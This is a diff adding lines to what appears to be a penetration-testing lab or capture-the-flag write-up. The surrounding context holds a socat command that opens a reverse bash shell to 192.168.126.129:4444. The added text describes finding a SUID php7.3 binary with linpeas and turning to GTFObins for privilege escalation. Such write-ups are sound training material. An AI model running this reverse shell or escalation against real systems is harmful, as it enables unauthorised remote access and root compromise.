@@ -52,3 +52,11 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.126.129:4444
 
 Then I ran `linpeas` on the target machine and after it finished and I was scanning through the results I found this:
 
+![](attachments/Pasted%20image%2020251127133130.png)
+
+which could lead to SUID privilege escalation. So I searched `GTFObins` and I found for `php` which I guessed could also be applicable to `php7.3`
+So I ran:
+
+```bash
+/usr/bin/php7.3
+```
